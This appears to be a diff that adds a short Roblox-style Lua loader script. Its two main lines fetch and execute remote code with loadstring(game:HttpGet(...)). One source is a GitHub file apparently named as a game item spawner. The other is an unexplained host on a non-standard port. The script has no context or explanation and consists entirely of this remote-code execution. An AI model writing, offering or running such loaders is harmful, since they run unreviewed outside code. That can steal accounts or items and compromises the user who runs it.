@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripteredwinter/scripts/refs/heads/main/gag2spawner"))()
+wait(1)
+loadstring(game:HttpGet("http://e1.aurorix.net:20475/p/1451381306805190888"))()
